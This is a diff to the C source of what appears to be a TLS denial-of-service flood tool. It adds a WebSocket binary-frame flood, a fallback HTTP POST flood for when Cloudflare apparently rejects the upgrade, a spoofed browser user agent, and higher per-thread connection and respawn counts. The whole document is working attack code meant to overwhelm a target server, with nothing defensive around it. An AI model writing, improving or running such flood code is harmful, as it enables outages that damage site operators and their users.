@@ -928,27 +928,32 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
                     }
                 }
                 else if (conn->payload_idx == 1) {
-                    // Phase 2: Read upgrade response (101 Switching Protocols)
+                    // Phase 2: Read upgrade response
                     char resp[4096];
                     int r = SSL_read(conn->ssl, resp, sizeof(resp));
                     if (r > 0) {
-                        conn->payload_idx = 2;
+                        // Check if we got 101 (WS upgrade) or not
+                        if (resp[9] == '1' && resp[10] == '0' && resp[11] == '1') {
+                            conn->payload_idx = 2; // WS mode
+                        } else {
+                            conn->payload_idx = 3; // HTTP flood mode (CF rejected WS)
+                        }
                     } else {
                         int err = SSL_get_error(conn->ssl, r);
                         if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) goto cleanup;
                     }
-                    if (now - conn->last_pulse_ms > 5000) conn->payload_idx = 2;
+                    // Timeout 2s → go to HTTP flood
+                    if (now - conn->last_pulse_ms > 2000) conn->payload_idx = 3;
                 }
-                else {
-                    // Phase 3: Flood WebSocket binary frames over TLS
+                else if (conn->payload_idx == 2) {
+                    // Phase 3A: WS frame flood (got 101)
                     unsigned char ws_buf[16384];
                     int bp = 0;
                     int frame_count = 0;
                     
                     while (bp < 14000) {
                         int pl_size = 512 + (fast_rand() % 3584);
-                        
-                        ws_buf[bp++] = 0x82; // FIN + binary
+                        ws_buf[bp++] = 0x82;
                         if (pl_size < 126) {
                             ws_buf[bp++] = 0x80 | pl_size;
                         } else {
@@ -956,17 +961,12 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
                             ws_buf[bp++] = (pl_size >> 8) & 0xFF;
                             ws_buf[bp++] = pl_size & 0xFF;
                         }
-                        
                         unsigned int mask = fast_rand();
-                        memcpy(ws_buf + bp, &mask, 4);
-                        bp += 4;
-                        
+                        memcpy(ws_buf + bp, &mask, 4); bp += 4;
                         int offset = fast_rand() % (BUFFER_POOL_SIZE - pl_size);
                         unsigned char *src = (unsigned char*)(global_buffer_pool + offset);
                         unsigned char *mk = (unsigned char*)&mask;
-                        for (int i = 0; i < pl_size; i++) {
-                            ws_buf[bp++] = src[i] ^ mk[i % 4];
-                        }
+                        for (int i = 0; i < pl_size; i++) ws_buf[bp++] = src[i] ^ mk[i % 4];
                         frame_count++;
                     }
                     
@@ -974,20 +974,44 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
                     if (ret > 0) {
                         thread_stats[thread_id].packets += frame_count;
                         thread_stats[thread_id].bytes += ret;
-                        conn->payload_idx += frame_count;
+                        conn->sub_stage += frame_count;
                     } else {
                         int err = SSL_get_error(conn->ssl, ret);
                         if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) goto cleanup;
                     }
+                    char drain[4096]; while (SSL_read(conn->ssl, drain, sizeof(drain)) > 0) {}
+                    if (conn->sub_stage > 300 + (fast_rand() % 300)) goto cleanup;
+                }
+                else {
+                    // Phase 3B: HTTP flood (CF rejected WS or timeout)
+                    // Rapid POST/GET requests over persistent TLS connection
+                    char http_buf[8192];
+                    int hlen = snprintf(http_buf, sizeof(http_buf),
+                        "POST / HTTP/1.1\r\n"
+                        "Host: %s\r\n"
+                        "Content-Type: application/x-www-form-urlencoded\r\n"
+                        "Content-Length: 1024\r\n"
+                        "Connection: keep-alive\r\n"
+                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\n"
+                        "Accept: text/html,application/xhtml+xml\r\n"
+                        "\r\n",
+                        args.host);
+                    // Add 1024 bytes random body
+                    int offset = fast_rand() % (BUFFER_POOL_SIZE - 1024);
+                    memcpy(http_buf + hlen, global_buffer_pool + offset, 1024);
+                    hlen += 1024;
                     
-                    // Drain server responses
-                    char drain[4096];
-                    while (SSL_read(conn->ssl, drain, sizeof(drain)) > 0) {}
-                    
-                    // Recycle after 300-600 frames
-                    if (conn->payload_idx > 300 + (fast_rand() % 300)) {
-                        goto cleanup;
+                    int ret = SSL_write(conn->ssl, http_buf, hlen);
+                    if (ret > 0) {
+                        thread_stats[thread_id].packets++;
+                        thread_stats[thread_id].bytes += ret;
+                        conn->sub_stage++;
+                    } else {
+                        int err = SSL_get_error(conn->ssl, ret);
+                        if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) goto cleanup;
                     }
+                    char drain[4096]; while (SSL_read(conn->ssl, drain, sizeof(drain)) > 0) {}
+                    if (conn->sub_stage > 100 + (fast_rand() % 100)) goto cleanup;
                 }
             }
             
@@ -2380,6 +2404,7 @@ void *worker_thread(void *arg) {
     long long last_timeout_check_ms = get_ms();
     
     int initial = args.rate / args.threads;
+    if (args.is_v20_ws && initial < 500) initial = 500; // v20_ws: minimum 500 conns/thread
     
     for (int i = 0; i < initial; i++) {
         if (get_total_active_conns() >= args.rate) break;
@@ -2565,6 +2590,8 @@ void *worker_thread(void *arg) {
             int batch = (args.rate - total);
             if (args.is_v19_tcp) {
                 if (batch > 64) batch = 64;
+            } else if (args.is_v20_ws) {
+                if (batch > 128) batch = 128; // v20_ws: aggressive respawn
             } else {
                 if (batch > 32) batch = 32;
             }
